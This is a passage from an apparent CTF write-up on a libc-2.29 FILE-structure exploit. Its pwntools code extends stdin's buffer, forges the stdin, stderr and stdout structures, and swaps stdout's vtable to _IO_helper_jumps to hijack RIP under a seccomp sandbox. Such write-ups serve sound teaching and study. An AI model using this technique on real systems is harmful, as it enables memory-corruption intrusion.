class="number">0x7fff0000</span>, <span class="number">0</span>, <span class="number">0</span>); # sys_read</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">1</span>, <span class="number">0</span>); # sys_write</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0x3c</span>, <span class="number">0</span>); # sys_exit</span><br><span class="line">sym.imp.seccomp_rule_add(iVar2, <span class="number">0x7fff0000</span>, <span class="number">0xe7</span>, <span class="number">0</span>); # sys_exit_group</span><br></pre></td></tr></table></figure><p>So we don’t have <strong>execve</strong> syscall so we can’t get a proper shell, but we still have <strong>sys_write</strong>,<strong>sys_read</strong>,<strong>sys_write</strong> which can be used to read the flag file from a path location.</p><h4 id="nohack-function"><a href="#nohack-function" class="headerlink" title="nohack function"></a>nohack function</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nohack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( ((_WORD)<span class="built_in">stdout</span> + <span class="number">2208</span>) &amp; <span class="number">0xFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"mprotect error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mprotect(&amp;<span class="built_in">stdout</span>[<span class="number">10</span>]._IO_write_end, <span class="number">0x700</span>uLL, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In <strong>libc-2.29</strong> the permissions to write in vtables are enabled so the author decided to make them read only but he did a mistake in setting the ranges, he missed a couple of tables:</p><h4 id="Blocked-vtables-from-the-author"><a href="#Blocked-vtables-from-the-author" class="headerlink" title="Blocked vtables from the author:"></a>Blocked vtables from the author:</h4><ul><li>_IO_wfile_jumps_mmap</li><li>_IO_wfile_jumps</li><li>_IO_wmem_jumps</li><li>_IO_mem_jumps</li><li>_IO_strn_jumps</li><li>_IO_obstack_jumps</li><li>_IO_file_jumps_maybe_mmap</li><li>_IO_file_jumps_mmap</li><li>_IO_file_jumps</li><li>_IO_str_jumps</li></ul><h4 id="Unblocked-vtables"><a href="#Unblocked-vtables" class="headerlink" title="Unblocked vtables:"></a>Unblocked vtables:</h4><ul><li>_IO_helper_jumps</li><li>_IO_cookie_jumps</li><li>_IO_proc_jumps</li><li>_IO_str_chk_jumps</li><li>_IO_wstrn_jumps</li><li>_IO_wfile_jumps_maybe_mmap</li></ul><p>Because of this the only thing we need to do is to change the <strong>vtable pointer</strong> into one of the writeable vtables to get control of rip.</p><h3 id="Get-arbitrary-write-with-“unlimited”-input"><a href="#Get-arbitrary-write-with-“unlimited”-input" class="headerlink" title="Get arbitrary write with “unlimited” input"></a>Get arbitrary write with “unlimited” input</h3><p>First thing we notice is that we have two very limited arbitrary writes with a max size of <strong>long long</strong> and we can only change <strong>two</strong> locations in memory.</p><p>This is the uninitialised <code>_IO_2_1_stdin_</code>:<br><a data-fancybox="gallery" href="https://i.imgur.com/NjshmMi.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NjshmMi.png" alt><br></a><br>What happens next depends on <strong>setvbuf</strong> option:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>From <a href="http://www.cplusplus.com/reference/cstdio/setvbuf/" target="_blank" rel="noopener">here</a> we know the option used is <code>_IONBF</code> which means “No buffering” the buffer is <strong>not</strong> used. Each I/O operation is written as <strong>soon</strong> as possible. This a usual thing in ctfs to disable buffering of <strong>stdout</strong>, <strong>stdin</strong> and <strong>stderr</strong> and this time is very handy for us because instead of allocating a new buffer on the heap, the limits of <code>_IO_buf_base</code> and <code>_IO_buf_end</code> will be defined with pointers within stdin where <code>_IO_buf_end-_IO_buf_base = 1</code> saving only 1 character which will be the end line character (‘\n’ or ‘’ depends on the input).</p><p>Here is the <strong>stdin</strong> after being initialized by <strong>setvbuf</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/leh8S9p.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/leh8S9p.png" alt><br></a><br>If we use the first <strong>scanf</strong> to increase the value of <code>stdio-&gt;_IO_buf_end</code>, instead of only controlling the <code>_shortbuf</code> field we will be able to control the contents of what comes next:<br><a data-fancybox="gallery" href="https://i.imgur.com/odMGD5L.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/odMGD5L.png" alt><br></a><br>Also the libc source code can be found <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/fileops.c#L1326" target="_blank" rel="noopener">at</a>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">          &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) <span class="comment">// sub must be positive</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">         waiting for input. */</span></span><br><span class="line">      _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">      count = want;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">        count -= want % block_size; <span class="comment">// writing in blocks </span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      count = _IO_SYSREAD (fp, s, count); <span class="comment">// we want to reach here in order to complete the read</span></span><br></pre></td></tr></table></figure></p><p>Much better images explaining the code above can be found in <a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique" target="_blank" rel="noopener">Angelboy</a> slides.</p><p>Python code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'1 : '</span>, <span class="string">"%x %x"</span> %(_IO_2_1_STDIN_+_IO_BUF_END,_IO_2_1_STDIN_+<span class="number">0x2000</span>))</span><br></pre></td></tr></table></figure><h3 id="Filling-the-memory"><a href="#Filling-the-memory" class="headerlink" title="Filling the memory"></a>Filling the memory</h3><p>From the initial plan we know we must change values on <code>_IO_2_1_STDOUT-&gt;file-&gt;vtable</code>, and values on the <code>_IO_helper_jumps</code> vtable but there will be a lot of values in the middle because we are overflowing everything from the very beginning, in this case from the <strong>stdin</strong> we can’t just fill everything with nulls and expect everything to run smoothly , obviously the program will break if we do that we need to keep an eye on the fields that contain mappable addresses.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> _lock(1st) and _wide_data(2nd) and vtable(last) fields must have </span><br><span class="line"> a valid mappable address preferable to the original ones(_lock).</span><br><span class="line">                                                            ^</span><br><span class="line">0x7fb4561efa80 &lt;_IO_2_1_stdin_+128&gt;:    0x000000000a000000  |__ 0x00007fb4561f2590</span><br><span class="line">0x7fb4561efa90 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  |   0x0000000000000000</span><br><span class="line">0x7fb4561efaa0 &lt;_IO_2_1_stdin_+160&gt;:    0x00007fb4561efae0 _|   0x0000000000000000 </span><br><span class="line">0x7fb4561efab0 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  |   0x0000000000000000</span><br><span class="line">0x7fb4561efac0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  |   0x0000000000000000</span><br><span class="line">0x7fb4561efad0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  |__ 0x00007fb4561f1560</span><br><span class="line">0x7fb4561efae0 &lt;_IO_wide_data_0&gt;:       0x0000000000000000      0x0000000000000000</span><br><span class="line">........</span><br><span class="line">0x7fb4561efc10 &lt;_IO_wide_data_0+304&gt;:   0x00007fb4561f1020      0x0000000000000000</span><br><span class="line">0x7fb4561efc20 &lt;__memalign_hook&gt;:       0x00007fb4560a4190      0x0000000000000000 -&gt; Can be filled with 0s</span><br><span class="line">0x7fb4561efc30 &lt;__malloc_hook&gt;: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561efc40 &lt;main_arena&gt;:    0x0000000000000000      0x0000000000000001-----------|</span><br><span class="line">......                                                                               |-&gt; Can be filled with 0s</span><br><span class="line">0x7fb4561f04d0 &lt;main_arena+2192&gt;:       0x0000000000021000      0x00007fb4560a5a90---|</span><br><span class="line">0x7fb4561f0520 &lt;default_overflow_region&gt;:       0x0000000000000000      0x0000000000000001 --|                                                                </span><br><span class="line">0x7fb4561f0530 &lt;default_overflow_region+16&gt;:    0x0000000000000002      0x00007fb4561f32d8   |                                                            </span><br><span class="line">0x7fb4561f0540 &lt;default_overflow_region+32&gt;:    0x0000000000000000      0xffffffffffffffff   |                                                             </span><br><span class="line">0x7fb4561f0550 &lt;__libc_utmp_jump_table&gt;:        0x00007fb4561ee6e0      0x00007fb4561c1e48   |-&gt; must be filled                                                            </span><br><span class="line">0x7fb4561f0560 &lt;_nl_global_locale&gt;:     0x00007fb4561ec580      0x00007fb4561ecac0           |with the correct                                                              </span><br><span class="line">...............                                                                              |values otherwise </span><br><span class="line">0x7fb4561f0640 &lt;_nl_global_locale+224&gt;: 0x00007fb4561bc678      0x0000000000000000 ----------|page fault.                                                             </span><br><span class="line">0x7fb4561f0650: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561f0660 &lt;_IO_list_all&gt;:  0x00007fb4561f0680      0x0000000000000000 --&gt; Keep this too</span><br><span class="line">0x7fb4561f0670: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7fb4561f0680 &lt;_IO_2_1_stderr_&gt;:       0x00000000fbad2087      0x00007fb4561f0703 --|-&gt;calculate the offsets                                                                        </span><br><span class="line">.....                                                                                |from the libc_base to</span><br><span class="line">0x7fb4561f0750 &lt;_IO_2_1_stderr_+208&gt;:   0x0000000000000000      0x00007fb4561f1560 --|read original values                                                                        </span><br><span class="line">0x7fb4561f0760 &lt;_IO_2_1_stdout_&gt;:       0x00000000fbad2887      0x00007fb4561f07e3 --|-&gt; Everything remains the                                                                       </span><br><span class="line">....                                                                               --|same</span><br><span class="line">0x7fb4561f0830 &lt;_IO_2_1_stdout_+208&gt;:   0x0000000000000000      0x00007fb4561f1560 -&gt; Change to _IO_helper_jumps                                                                         </span><br><span class="line">0x7fb4561f0840 &lt;stderr&gt;:        0x00007fb4561f0680      0x00007fb4561f0760--|-&gt; Stays the same</span><br><span class="line">0x7fb4561f0850 &lt;stdin&gt;: 0x00007fb4561efa00      0x00007fb456031e90----------|</span><br><span class="line">0x7fb4561f0860 &lt;__elf_set___libc_subfreeres_element_free_mem__&gt;:        0x00007fb45619fdd0--|-&gt; can be filled</span><br><span class="line">...                                                                                         |with 0s. </span><br><span class="line">0x7fb4561f0940 &lt;__elf_set___libc_subfreeres_element_pw_map_free__&gt;:     0x00007fb4561a1d10--|      </span><br><span class="line">0x7fb4561f0950: 0x0000000000000000      0x0000000000000000</span><br><span class="line">                                                           |-&gt; the address that will control RIP</span><br><span class="line">0x7fb4561f0960 &lt;_IO_helper_jumps&gt;:      0x0000000000000000 |    0x0000000000000000</span><br><span class="line">0x7fb4561f0970 &lt;_IO_helper_jumps+16&gt;:   0x00007fb45609ca70_|    0x00007fb45607f530</span><br><span class="line">0x7fb4561f0980 &lt;_IO_helper_jumps+32&gt;:   0x00007fb45609c140      0x00007fb45609c150</span><br><span class="line">0x7fb4561f0990 &lt;_IO_helper_jumps+48&gt;:   0x00007fb45609d7b0      0x00007fb45609c1b0</span><br><span class="line">0x7fb4561f09a0 &lt;_IO_helper_jumps+64&gt;:   0x00007fb45609c3b0      0x00007fb45609cae0</span><br><span class="line">0x7fb4561f09b0 &lt;_IO_helper_jumps+80&gt;:   0x00007fb45609c800      0x00007fb45609c6d0</span><br><span class="line">0x7fb4561f09c0 &lt;_IO_helper_jumps+96&gt;:   0x00007fb45609ca60      0x00007fb45609c870</span><br><span class="line">0x7fb4561f09d0 &lt;_IO_helper_jumps+112&gt;:  0x00007fb45609d910      0x00007fb45609d920</span><br><span class="line">0x7fb4561f09e0 &lt;_IO_helper_jumps+128&gt;:  0x00007fb45609d8f0      0x00007fb45609ca60</span><br><span class="line">0x7fb4561f09f0 &lt;_IO_helper_jumps+144&gt;:  0x00007fb45609d900      0x0000000000000000</span><br><span class="line">0x7fb4561f0a00 &lt;_IO_helper_jumps+160&gt;:  0x0000000000000000      0x0000000000000000</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now in python, filling <strong>stdin</strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDIN+131</span></span><br><span class="line">INPUT2 =<span class="string">'\x0a'</span>+<span class="string">'\x00'</span>*<span class="number">4</span><span class="comment"># p64(_IO_STDFILE_0_LOCK)</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_0_LOCK)</span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_0) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable"""</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)*<span class="number">19</span>*<span class="number">2</span> + p64(LIBC+<span class="number">0x1bb020</span>)+p64(<span class="number">0x0</span>)</span><br><span class="line">INPUT2 += p64(LIBC+libc.symbols[<span class="string">'__memalign_hook'</span>]) <span class="comment"># __memalign_hook</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)</span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure></p><p>Filling from <strong>main_arena</strong> until the end of <code>_nl_global_locale</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += <span class="string">'\x00'</span>*<span class="number">2208</span> <span class="comment"># MAIN_ARENA</span></span><br><span class="line">INPUT2 += p64(LIBC+<span class="number">0x896b0</span>) + p64(<span class="number">0x0</span>) <span class="comment"># obstack_alloc_failed_handler</span></span><br><span class="line">INPUT2 += p64(LIBC+<span class="number">0x185072</span>)*<span class="number">2</span> <span class="comment"># tzname</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># program_invocation_short_name</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(LIBC+<span class="number">0x1bd2d8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">-0x1</span>,signed=<span class="keyword">True</span>) <span class="comment"># default_overflow_region</span></span><br><span class="line">INPUT2 += p64(LIBC)+p64(LIBC) <span class="comment"># __libc_utmp_jump_table</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># _nl_global_locale</span></span><br><span class="line">OFFSETLIST = [<span class="number">1971584</span>, <span class="number">1972928</span>, <span class="number">1973056</span>, <span class="number">1975232</span>, <span class="number">1972480</span>, <span class="number">1972352</span>, <span class="number">0</span>, <span class="number">1974400</span>, <span class="number">1974496</span>, <span class="number">1974624</span>, <span class="number">1974816</span>, <span class="number">1974944</span>, <span class="number">1975040</span>, <span class="number">1680352</span>, <span class="number">1676512</span>, <span class="number">1678048</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> OFFSETLIST:</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:    </span><br><span class="line">        INPUT2 += p64(LIBC+offset)</span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">INPUT2 += p64(_IO_LIST_ALL+<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># IO_LIST_ALL</span></span><br></pre></td></tr></table></figure></p><p>Filling <strong>stderr</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDERR</span></span><br><span class="line">INPUT2 += p64(<span class="number">0xfbad2887</span>) <span class="comment"># _flags</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># _chain</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_2_LOCK) <span class="comment"># _lock</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_2) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable</span></span><br></pre></td></tr></table></figure><p>Changing stdout vtable from <code>_IO_file_jumps</code> to <code>_IO_helper_jumps</code> to bypass the <strong>mprotect call</strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDOUT</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _flags</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># _chain</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_1_LOCK) <span class="comment"># _lock</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_1) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span 